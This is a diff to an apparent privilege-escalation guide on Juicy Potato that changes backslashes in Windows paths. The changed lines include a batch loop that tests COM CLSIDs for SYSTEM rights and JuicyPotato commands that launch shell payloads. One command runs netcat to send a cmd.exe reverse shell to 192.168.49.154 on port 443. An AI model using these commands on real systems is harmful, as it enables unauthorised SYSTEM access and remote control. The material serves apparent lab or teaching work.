@@ -42,9 +42,9 @@ Content of our test.bat file
 :: Starting port, you can change it
 set /a port=10000
 SETLOCAL ENABLEDELAYEDEXPANSION
-FOR /F %%i IN (C:\Users\Bob\Desktop\CLSID.list) DO (
+FOR /F %%i IN (C:\\Users\\Bob\Desktop\\CLSID.list) DO (
 echo %%i !port!
-C:\Users\Bob\Desktop\jp32.exe -z -l !port! -c %%i >> result.log
+C:\\Users\\Bob\\Desktop\\jp32.exe -z -l !port! -c %%i >> result.log
 set RET=!ERRORLEVEL!
 :: echo !RET!
 if "!RET!" == "1" set /a port=port+1
@@ -52,7 +52,7 @@ if "!RET!" == "1" set /a port=port+1
 
 ```
 # Changes to Make
-Note: C:\Users\Bob\Desktop\CLSID.list and C:\Users\Bob\Desktop\jp32.exe are the place where we gonna upload our CLSID.list file and jp32.exe (juicy potato 32-bit).
+Note: C:\\Users\\Bob\\Desktop\\CLSID.list and C:\\Users\\Bob\\Desktop\\jp32.exe are the place where we gonna upload our CLSID.list file and jp32.exe (juicy potato 32-bit).
 
 
 # Using Powershell
@@ -97,7 +97,7 @@ Now we've found valid CLSID for SYSTEM we can use that CLSID and get system shel
 
 ```markdown
 
-c:\Users\Bob\Desktop\JuicyPotato.exe -l 1234 -p c:\Users\Bob\Desktop\shell.bat -t * -c {c980e4c2-c178-4572-935d-a8a429884806} 
+c:\\Users\\Bob\\Desktop\\JuicyPotato.exe -l 1234 -p c:\\Users\\Bob\\Desktop\\shell.bat -t * -c {c980e4c2-c178-4572-935d-a8a429884806} 
 
 ```
 
@@ -105,7 +105,7 @@ c:\Users\Bob\Desktop\JuicyPotato.exe -l 1234 -p c:\Users\Bob\Desktop\shell.bat -
 
 ```markdown
 
-c:\Users\Bob\Desktop\jp32.exe -l 443 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Bob\Desktop\nc.exe -e cmd.exe 192.168.49.154 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
+c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\nc.exe -e cmd.exe 192.168.49.154 443" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}
 
 ```
 
@@ -113,7 +113,7 @@ c:\Users\Bob\Desktop\jp32.exe -l 443 -p c:\windows\system32\cmd.exe -a "/c c:\Us
 
 ```markdown
 
-c:\Users\Bob\Desktop\jp32.exe -l 443 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Bob\Desktop\shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+c:\\Users\\Bob\\Desktop\\jp32.exe -l 443 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\Users\\Bob\\Desktop\\shell.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 
 ```
 
